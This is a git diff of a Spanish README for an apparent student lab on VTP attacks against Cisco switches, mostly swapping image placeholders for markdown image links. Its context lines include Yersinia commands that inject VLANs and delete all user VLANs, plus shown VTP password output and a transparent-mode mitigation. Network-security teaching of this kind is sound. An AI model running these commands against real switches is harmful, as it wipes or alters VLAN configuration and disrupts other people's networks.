@@ -17,7 +17,7 @@ Enlace GitHub: https://github.com/juniorjaviersantosperez/VTP-Attacks
 
 ## Topología
 
-Imagen 1 
+![Topología](IMAGENES/1.png)
 
 | Dispositivo | Rol | Interfaz | Conexión |
 |---|---|---|---|
@@ -33,7 +33,7 @@ Imagen 1
 
 ### SW1 — VTP Server
 
-IMAGEN 2
+![Topología](IMAGENES/2.png)
 
 - Dominio: ITLA  
 - VTP versión: 1  
@@ -44,7 +44,7 @@ IMAGEN 2
 
 ### SW2 — VTP Client
 
-IMAGEN 3
+![Topología](IMAGENES/3.png)
 
 - Dominio: ITLA  
 - VTP versión: 1  
@@ -96,12 +96,12 @@ sudo yersinia -I
 
 Dentro de Yersinia: F2 → VTP mode → a → agregar VLAN
 
-IMAGEN 4
-IMAGEN 5
+![Topología](IMAGENES/4.png)
+![Topología](IMAGENES/5.png)
 
 ### Estado después del ataque
 
-IMAGEN 6
+![Topología](IMAGENES/6.png)
 
 ```
 SW1# show vlan brief
@@ -126,9 +126,9 @@ Eliminar todas las VLANs definidas por el usuario en SW1 y SW2 enviando un anunc
 ```bash
 sudo yersinia vtp -attack 1 -interface eth0
 ```
+![Topología](IMAGENES/7.png)
 
-IMAGEN 7
-IMAGEN 8
+![Topología](IMAGENES/8.png)
 
 ### Estado después del ataque
 
@@ -163,7 +163,7 @@ SW1# show vtp password
 VTP Password: cisco
 ```
 
-IMAGEN 9
+![Topología](IMAGENES/9.png)
 
 ### Efecto
 ```
@@ -190,7 +190,7 @@ SW1(config)# vtp mode transparent
 Setting device to VTP Transparent mode for VLANS.
 ```
 
-IMAGEN 10
+![Topología](IMAGENES/10.png)
 
 ### Efecto
 ```
